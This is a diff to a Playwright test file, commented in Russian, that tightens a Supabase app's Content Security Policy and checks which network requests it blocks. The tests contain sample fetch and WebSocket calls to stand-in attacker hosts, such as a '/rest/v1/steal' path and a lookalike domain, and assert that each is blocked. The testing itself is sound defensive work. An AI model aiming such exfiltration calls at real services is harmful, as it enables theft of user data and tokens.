@@ -2,10 +2,11 @@ import type { Page, Request, Route } from '@playwright/test';
 import { expect, test } from '../helpers';
 import { readFileSync } from 'node:fs';
 import { join } from 'node:path';
-import { buildVariant, headersFor, listFiles, recordViolations, startHeaderServer, type HeaderServer } from './helpers';
+import { buildVariant, headersFor, listFiles, parseCsp, recordViolations, startHeaderServer, type HeaderServer } from './helpers';
 
 /* ---------------------------------------------------------------------------------------------
  * Облачный режим под CSP: сборка с VITE_SUPABASE_URL=https://example-ref.supabase.co и поддельным ключом.
+ * Политика в этой сборке разрешает ТОЧНО этот проект (https + wss), а не любой *.supabase.co: запрос к чужому проекту блокируется.
  * Supabase подменён заглушкой на уровне сети (page.route): если бы CSP заблокировал запрос, заглушка до него не дошла бы.
  * Заодно: что человек видит, что лежит в хранилище, куда уходят токены и что попадает в отчёт проверки облака.
  * ------------------------------------------------------------------------------------------- */
@@ -122,7 +123,17 @@ test.describe('Облачный режим: CSP и Supabase', () => {
     await expect(page.getByRole('heading', { level: 1, name: 'Вход' })).toBeVisible();
     const outcome = await page.evaluate(async () => {
       const r: Record<string, string> = {};
-      for (const [k, u] of Object.entries({ other: 'https://evil.example/x', lookalike: 'https://example-ref.supabase.co.evil.example/x', http: 'http://example-ref.supabase.co/x' })) {
+      const attempts = {
+        other: 'https://evil.example/x',
+        lookalike: 'https://example-ref.supabase.co.evil.example/x',
+        http: 'http://example-ref.supabase.co/x',
+        // кража в ЧУЖОЙ проект Supabase: подстановка *.supabase.co его пропускала, точный адрес — нет
+        foreignProject: 'https://attacker-ref.supabase.co/rest/v1/steal',
+        foreignAuth: 'https://attacker-ref.supabase.co/auth/v1/token',
+        parentDomain: 'https://supabase.co/x',
+        subOfOwn: 'https://x.example-ref.supabase.co/x',
+      };
+      for (const [k, u] of Object.entries(attempts)) {
         try { await fetch(u); r[k] = 'sent'; } catch (e) { r[k] = (e as Error).name; }
       }
       return r;
@@ -130,6 +141,8 @@ test.describe('Облачный режим: CSP и Supabase', () => {
     const v = (await violations()).filter((x) => x.directive === 'connect-src').map((x) => x.blocked);
     expect(v.some((b) => b.includes('evil.example/x')), `connect-src на evil.example: ${v.join(' | ')}`).toBe(true);
     expect(v.some((b) => b.startsWith('https://example-ref.supabase.co.evil.example')), 'двойник *.supabase.co.evil.example не пропущен').toBe(true);
+    expect(v.some((b) => b.startsWith('https://attacker-ref.supabase.co/rest/v1/steal')), `чужой проект Supabase заблокирован: ${v.join(' | ')}`).toBe(true);
+    expect(v.some((b) => b.startsWith('https://attacker-ref.supabase.co/auth/v1/token'))).toBe(true);
     expect(Object.values(outcome).every((x) => x === 'TypeError'), JSON.stringify(outcome)).toBe(true);
   });
 
@@ -231,8 +244,41 @@ test.describe('Облачный режим: CSP и Supabase', () => {
     await expect(page.getByRole('heading', { level: 1, name: 'Главная' })).toBeVisible();
   });
 
-  test('заголовки облачной сборки те же (CSP не зависит от ключей сборки)', async ({ request }) => {
+  test('мета-политика облачной сборки: точный адрес проекта (https и wss), без звёздочек, стиль строгий; заголовок тот же, что и в локальной', async ({ request }) => {
+    const html = readFileSync(join(variantDir, 'index.html'), 'utf8');
+    const meta = html.match(/http-equiv="Content-Security-Policy"\s+content="([^"]*)"/)?.[1] ?? '';
+    expect(meta).not.toContain('@@');
+    expect(meta).not.toMatch(/\*/);
+    const csp = parseCsp(meta);
+    expect(csp['connect-src']).toEqual(["'self'", SUPA, `wss://${REF}.supabase.co`, ...RATE_HOSTS]);
+    expect(csp['style-src']).toEqual(["'self'"]);
+    expect(csp['script-src']).toEqual(["'self'"]);
+    // заголовок не зависит от ключей сборки и содержит только frame-ancestors
     const r = await request.get(`${srv.origin}/`);
     expect(r.headers()['content-security-policy']).toBe(headersFor('/')['content-security-policy']);
+    expect(parseCsp(r.headers()['content-security-policy'] ?? '')).toEqual({ 'frame-ancestors': ["'none'"] });
+  });
+
+  test('WebSocket (realtime): свой проект по wss политика не блокирует, чужой проект и ws:// (без шифрования) — блокирует', async ({ page, errors }) => {
+    // Playwright подменяет WebSocket на уровне страницы (routeWebSocket) раньше политики, поэтому здесь настоящие соединения:
+    // свой адрес в песочнице недоступен (ошибка сети — это нормально), а нарушения политики видны по событию securitypolicyviolation.
+    errors.allow(/Refused to|Content Security Policy|WebSocket/i);
+    const violations = await recordViolations(page);
+    await mockSupabase(page, { loginOk: false });
+    await page.goto(`${srv.origin}/#/`);
+    await expect(page.getByRole('heading', { level: 1, name: 'Вход' })).toBeVisible();
+    await page.evaluate(() => {
+      for (const u of ['wss://example-ref.supabase.co/realtime/v1/websocket', 'wss://attacker-ref.supabase.co/realtime/v1/websocket', 'ws://example-ref.supabase.co/realtime/v1/websocket']) {
+        try { new WebSocket(u).addEventListener('error', () => undefined); } catch { /* блокировка может быть и исключением */ }
+      }
+    });
+    await expect
+      .poll(async () => (await violations()).filter((x) => x.directive === 'connect-src').length, { message: 'нарушения connect-src должны быть записаны' })
+      .toBeGreaterThanOrEqual(2);
+    await page.waitForTimeout(500);
+    const blocked = (await violations()).filter((x) => x.directive === 'connect-src').map((x) => x.blocked);
+    expect(blocked.some((b) => b.startsWith('wss://attacker-ref.supabase.co')), `чужой wss заблокирован: ${blocked.join(' | ')}`).toBe(true);
+    expect(blocked.some((b) => b.startsWith('ws://example-ref.supabase.co')), 'ws:// (без шифрования) к своему проекту заблокирован').toBe(true);
+    expect(blocked.some((b) => b.startsWith('wss://example-ref.supabase.co')), 'свой wss не заблокирован').toBe(false);
   });
 });
